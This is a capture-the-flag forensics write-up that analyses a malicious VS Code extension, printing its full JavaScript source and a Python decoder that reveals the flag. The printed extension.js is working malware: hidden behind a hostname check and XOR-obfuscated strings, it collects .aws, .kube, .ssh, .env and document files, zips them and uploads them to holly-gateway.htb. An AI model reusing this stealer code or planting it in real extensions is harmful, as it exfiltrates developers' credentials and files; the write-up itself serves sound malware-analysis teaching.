# Snowy Extension
## Difficulty: very easy

> The Starshard Bauble’s theft left behind subtly altered source files hidden among festive scripts. Players must inspect code highlighting anomalies to spot injected logic, trace tampering patterns, and reveal how the Gingerbit Gremlin sabotaged Everlight, one miscolored line at a time.

## Step 1
Download the file from the site to get the file `forensics_snowy_extension.zip`, the unzip.

This will give us a **Microsoft OOXML** or a Visual Studio Code extension package file: `code-highlight-0.0.1.vsix`.

Let't extract the file:

```
$ unzip code-highlight-0.0.1.vsix -d extension/
Archive:  code-highlight-0.0.1.vsix
  inflating: extension/[Content_Types].xml  
  inflating: extension/extension.vsixmanifest  
  inflating: extension/extension/extension.js  
  inflating: extension/extension/package.json  
  inflating: extension/extension/readme.md

└─$ cd extension && tree
.
├── [Content_Types].xml
├── extension
│   ├── extension.js
│   ├── package.json
│   └── readme.md
└── extension.vsixmanifest

2 directories, 5 files
```

## Step 2

Here are the contents of the following files:
```
$ cat '[Content_Types].xml' 
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension=".js" ContentType="application/javascript"/><Default Extension=".json" ContentType="application/json"/><Default Extension=".md" ContentType="text/markdown"/><Default Extension=".vsixmanifest" ContentType="text/xml"/></Types>

$ cat extension.vsixmanifest 
<?xml version="1.0" encoding="utf-8"?>
        <PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011" xmlns:d="http://schemas.microsoft.com/developer/vsx-schema-design/2011">
                <Metadata>
                        <Identity Language="en-US" Id="code-highlight" Version="0.0.1" Publisher="undefined" />
                        <DisplayName>code-highlight</DisplayName>
                        <Description xml:space="preserve">Highlights the code for serious developers</Description>
                        <Tags>keybindings</Tags>
                        <Categories>Other</Categories>
                        <GalleryFlags>Public</GalleryFlags>

                        <Properties>
                                <Property Id="Microsoft.VisualStudio.Code.Engine" Value="^1.106.3" />
                                <Property Id="Microsoft.VisualStudio.Code.ExtensionDependencies" Value="" />
                                <Property Id="Microsoft.VisualStudio.Code.ExtensionPack" Value="" />
                                <Property Id="Microsoft.VisualStudio.Code.ExtensionKind" Value="workspace" />
                                <Property Id="Microsoft.VisualStudio.Code.LocalizedLanguages" Value="" />
                                <Property Id="Microsoft.VisualStudio.Code.EnabledApiProposals" Value="" />

                                <Property Id="Microsoft.VisualStudio.Code.ExecutesCode" Value="true" />






                                <Property Id="Microsoft.VisualStudio.Services.GitHubFlavoredMarkdown" Value="true" />
                                <Property Id="Microsoft.VisualStudio.Services.Content.Pricing" Value="Free"/>



                        </Properties>


                </Metadata>
                <Installation>
                        <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
                </Installation>
                <Dependencies/>
                <Assets>
                        <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true" />
                        <Asset Type="Microsoft.VisualStudio.Services.Content.Details" Path="extension/readme.md" Addressable="true" />
                </Assets>
        </PackageManifest>
```

```
$ cd extension/

$ cat package.json 
{
  "name": "code-highlight",
  "displayName": "code-highlight",
  "description": "Highlights the code for serious developers",
  "version": "0.0.1",
  "engines": {
    "vscode": "^1.106.3"
  },
  "categories": [
    "Other"
  ],

  "main": "./extension.js",
  "contributes": {
    "commands": [
      {
        "command": "code-highlight.activate",
        "title": "Code Highlight: Activate"
      }
    ],
    "keybindings": [
      {
        "command": "code-highlight.activate",
        "key": "ctrl+alt+h",
        "when": "editorTextFocus"
      }
    ]
  },

  "scripts": {
    "lint": "eslint .",
    "pretest": "npm run lint",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/vscode": "^1.106.1",
    "@types/mocha": "^10.0.10",
    "@types/node": "22.x",
    "eslint": "^9.39.1",
    "@vscode/test-cli": "^0.0.12",
    "@vscode/test-electron": "^2.5.2"
  }
}

$ cat extension.js 
const vscode = require("vscode");
const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");
const https = require("http");

function activate(context) {

        console.log('❄ ❄ ❄ Code-Highlight extension is active... ❄ ❄ ❄');

        const disposable = vscode.commands.registerCommand('code-highlight.activate', async function () {
                if (os.hostname() !== 'frosty-node') {
                        vscode.window.showInformationMessage('Code Highlight activated!');
                        return;
                }

                function UhlAGtoaWM() {
                        const ZPtKUr = 'sn0wwyy';
                        const QMOHbr = 'gl0be1337';
                        return ZPtKUr + QMOHbr; 
                }

                const WkZtejFrZT = Buffer.from(UhlAGtoaWM(), 'utf8');


                function czIixzVTWz(buf, keyBytes = WkZtejFrZT) {
                const out = Buffer.alloc(buf.length);
                for (let i = 0; i < buf.length; i++) {
                        out[i] = buf[i] ^ keyBytes[i % keyBytes.length]; 
                }
                        return out;
                }


                function qmJJvtPnmp(b64) {
                        const buf = Buffer.from(b64, 'base64');
                        const FftbsaD = czIixzVTWz(buf);
                        return FftbsaD.toString('utf8');
                }

                const iAjuwiisFf = [
                "XQ9HBA==",
                "XQVFFRI=",
                "XR1DHw==",
                "XQteAQ==",
                "XR5UEQ==",
                "XQpfFA8=",
                "OzpyDDpNFQ4PWVIQQmw=",
                "JT1zKDIBDQICQ1NVXwY=",
                "LF9DKBlJDQ9dXgU6XwBESg=="
                ]

                const homedir = os.homedir();
                const stagedr = path.join(homedir, 'important-folder');
                const ext = iAjuwiisFf.map(qmJJvtPnmp);
                if (!fs.existsSync(stagedr)) fs.mkdirSync(stagedr);

                function scan(dir, depth = 0) {
                        if (depth > 3) return;
                        try {
                                fs.readdirSync(dir).forEach(item => {
                                        const fullPath = path.join(dir, item);
                                        try {
                                                const stats = fs.statSync(fullPath);
                                                if (ext.some(p => item.includes(p))) {
                                                        if (stats.isFile()) {
                                                                fs.copyFileSync(fullPath, path.join(stagedr, item));
                                                        }
                                                }
                                                if (stats.isDirectory() && !item.startsWith('.')) {
                                                        scan(fullPath, depth + 1);
                                                }
                                        } catch {}
                                });
                        } catch {}
                }

                scan(homedir);

                const zipPath = path.join(homedir, 'documents.zip');
                try {
                        execSync(`cd "${homedir}" && zip -r documents.zip important-folder`, { stdio: 'ignore' });
                } catch {}

                if (fs.existsSync(zipPath)) {
                        const data = fs.readFileSync(zipPath);
                        const req = https.request({
                                hostname: 'holly-gateway.htb',
                                port: 8080,
                                path: '/upload',
                                method: 'POST',
                                headers: { 'Content-Length': data.length }
                        });
                        req.write(data);
                        req.end();
                }
                vscode.window.showInformationMessage('Highlight applied, and is working as intended!');
        });
        context.subscriptions.push(disposable);
}

function deactivate() {}
module.exports = { activate, deactivate }

$ cat readme.md       
# code-highlight 

A very simple code highlighting extension for developers, simple and easy to use. Has been checked to not contain any malware.

# Features

Highlights important code with vibrant holiday colors and syntax features.  

```

## Step 3

> From static analysis alone, we can establish:
> This is a malicious VS Code extension
> The malicious logic is:
>> - gated by hostname
>> - obfuscated via XOR + Base64
>> - designed for credential exfiltration

> The challenge is forensics, not exploitation
> The description explicitly asks us to:
>> inspect code highlighting anomalies, trace tampering patterns, and reveal how the Gingerbit Gremlin sabotaged Everlight

inspect code highlighting anomalies, trace tampering patterns, and reveal how the Gingerbit Gremlin sabotaged Everlight

So the flag is not “what does the malware steal”, but who / what authored it.

From inspecting the following files, especially `extension.js`, we see a group of suspicious snippets of scripts.

We are also given a XOR key which 

```

function UhlAGtoaWM() {
        const ZPtKUr = 'sn0wwyy';
        const QMOHbr = 'gl0be1337';
        return ZPtKUr + QMOHbr; 
       }
```
> XOR Key: `sn0wwyygl0be1337`


We also have a this suspicious array of base64:

```
const iAjuwiisFf = [
                "XQ9HBA==",
                "XQVFFRI=",
                "XR1DHw==",
                "XQteAQ==",
                "XR5UEQ==",
                "XQpfFA8=",
                "OzpyDDpNFQ4PWVIQQmw=",
                "JT1zKDIBDQICQ1NVXwY=",
                "LF9DKBlJDQ9dXgU6XwBESg=="
                ]
```
Which is used to the following scripts:
```
const ext = iAjuwiisFf.map(qmJJvtPnmp);

if (ext.some(p => item.includes(p)))
```
These decode to file / directory name substrings
That means:
- They must be printable
- They must make sense
- They are the real payload

## Step 4
Let's use the generated code from ChatGPT to decode the following obfuscated code:
```
import base64

key = b"sn0wwyygl0be1337"

def dec(s):
    b = base64.b64decode(s)
    return bytes([b[i] ^ key[i % len(key)] for i in range(len(b))]).decode()

arr = [
  "XQ9HBA==",
  "XQVFFRI=",
  "XR1DHw==",
  "XQteAQ==",
  "XR5UEQ==",
  "XQpfFA8=",
  "OzpyDDpNFQ4PWVIQQmw=",
  "JT1zKDIBDQICQ1NVXwY=",
  "LF9DKBlJDQ9dXgU6XwBESg=="
]

for x in arr:
    print(dec(x))
```

Run the following script:
```
.aws
.kube
.ssh
.env
.pdf
.docx
HTB{M4lici0us_
VSC_Extens10n5
_1s_n0th1ng_n3w}

=== Code Execution Successful ===
```

Flag: `HTB{M4lici0us_VSC_Extens10n5_1s_n0th1ng_n3w}`
